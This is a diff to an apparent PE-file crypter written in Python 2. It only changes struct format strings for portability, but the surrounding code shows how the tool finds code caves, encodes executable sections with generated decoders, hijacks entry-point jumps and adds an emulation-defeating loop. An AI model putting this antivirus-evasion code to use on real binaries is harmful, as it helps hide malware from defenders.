@@ -156,7 +156,7 @@ def find_codecave_space(pe, required_space):
 				null_count += 1
 				if null_count >= required_space: # we've hit our required space limit
 					raw_offset = byte_count - null_count + 2 # calculate the raw offset of the code cave for writing 
-					virtual_offset = struct.pack("L",(raw_offset) + virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint) # calculate the virtual offset
+					virtual_offset = struct.pack("=L",(raw_offset) + virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint) # calculate the virtual offset
 					code_cave_section = section_header.Name
 					print "\t[+] At least %i null bytes found in %s section to host code cave" % (null_count, code_cave_section)
 					make_section_writeable(pe, code_cave_section) # section at least needs to be executable, currently make it writeable also
@@ -194,7 +194,7 @@ def get_code_cave (pe, skip_cave_search):
 			print "Could not retrieve created code cave location. Check write permissions and try again."
 			sys.exit(2)
 			
-	code_cave_address = hex(pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint + struct.unpack("L",code_cave_virtual_offset)[0])
+	code_cave_address = hex(pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint + struct.unpack("=L",code_cave_virtual_offset)[0])
 	print "[*] Code cave located at %s" % (code_cave_address)	
 	return pe, code_cave_address, code_cave_virtual_offset, code_cave_raw_offset, code_cave_section
 	
@@ -315,7 +315,7 @@ def print_section_bytes(pe, section_range):
 '''
 def get_virtual_offset(virtual_address, pe):
 	#return relative jump location for code cave = section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase		
-	return struct.pack("L",virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint)	
+	return struct.pack("=L",virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint)	
 
 '''
 	Make section of the pe file writable
@@ -554,7 +554,7 @@ def build_decoder(pe, encoder, section, decode_start, decode_end):
 	for i in encoder:
 		encode_instruction = i.split(" ")[0] # get encoder operation
 		modifier = int(i.split(" ")[1])		 # get operation modifier
-		decode_instruction = (decode_instructions[encode_instruction] + struct.pack("B", modifier)) # get corresponding decoder instruction
+		decode_instruction = (decode_instructions[encode_instruction] + struct.pack("=B", modifier)) # get corresponding decoder instruction
 		decoder = decode_instruction + decoder # prepend the decode instruction to execute in reverse order
 		
 		# add some fill instructions
@@ -676,14 +676,14 @@ def encode_data(pe, section_to_encode, encoder):
 					# build the decoder for each section
 					image_base = pe.OPTIONAL_HEADER.ImageBase
 					section_start = image_base + section_header.VirtualAddress
-					decode_start = struct.pack("L", section_start + encode_offset)
+					decode_start = struct.pack("=L", section_start + encode_offset)
 					
 					if encode_length == 0:
 						# encode / decode until the end of the section
-						decode_end = struct.pack("L", section_start + section_header.Misc_VirtualSize)
+						decode_end = struct.pack("=L", section_start + section_header.Misc_VirtualSize)
 					else:
 						# stop encoding / decoding at desired location represented by offset + length
-						decode_end = struct.pack("L", section_start + encode_offset + encode_length)
+						decode_end = struct.pack("=L", section_start + encode_offset + encode_length)
 					
 					decoder += build_decoder(pe, encoder, section_header, decode_start, decode_end) # now build the corresponding decoder
 					encoded_data = "" # will hold encoded data
@@ -813,10 +813,10 @@ def modify_entry_instructions(ep_ava, original_instructions, heuristic_decoder_o
 		# check opcode to see if it's is a relative conditional or unconditional jump 
 		if opcode in conditional_jump_opcodes:
 			new_jmp_loc = update_jump_location(asm, current_address, 6)
-			new_instruct_bytes = conditional_jump_opcodes[opcode] + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update location
+			new_instruct_bytes = conditional_jump_opcodes[opcode] + struct.pack("=l", new_jmp_loc) # replace short jump with long jump and update location
 		elif opcode in unconditional_jump_opcodes:
 			new_jmp_loc = update_jump_location(asm, current_address, 5)
-			new_instruct_bytes = unconditional_jump_opcodes[opcode]  + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update locatio
+			new_instruct_bytes = unconditional_jump_opcodes[opcode]  + struct.pack("=l", new_jmp_loc) # replace short jump with long jump and update locatio
 		else:
 			new_instruct_bytes = instruct_bytes
 			
@@ -832,10 +832,10 @@ def build_new_entry_jump(current_address, new_entry_address):
 
 	if new_entry_address < current_address:
 		new_entry_loc = (current_address + 5 - new_entry_address) * -1  # backwards jump
-		jmp_instruction = "\xe9" + struct.pack("l", new_entry_loc)
+		jmp_instruction = "\xe9" + struct.pack("=l", new_entry_loc)
 	else:
 		new_entry_loc = (current_address + 5 - new_entry_address) # forwards jump
-		jmp_instruction = "\xe9" + struct.pack("L", new_entry_loc)
+		jmp_instruction = "\xe9" + struct.pack("=L", new_entry_loc)
 	
 	return jmp_instruction
 
@@ -851,7 +851,7 @@ def generate_heuristic(loop_limit):
 	heuristic += add_fill_instructions(fill_limit)									# fill
 	heuristic += "\x40"   															# INC EAX
 	heuristic += add_fill_instructions(fill_limit)									# fill
-	heuristic += "\x3D" + struct.pack("L", loop_limit)  							# CMP EAX,loop_limit
+	heuristic += "\x3D" + struct.pack("=L", loop_limit)  							# CMP EAX,loop_limit
 	short_jump = binascii.unhexlify(format((1 << 16) - (len(heuristic)), 'x')[2:])  # Jump immediately after XOR EAX,EAX
 	heuristic += "\x75" + short_jump   											    # JNZ SHORT 
 	heuristic += add_fill_instructions(fill_limit)									# fill
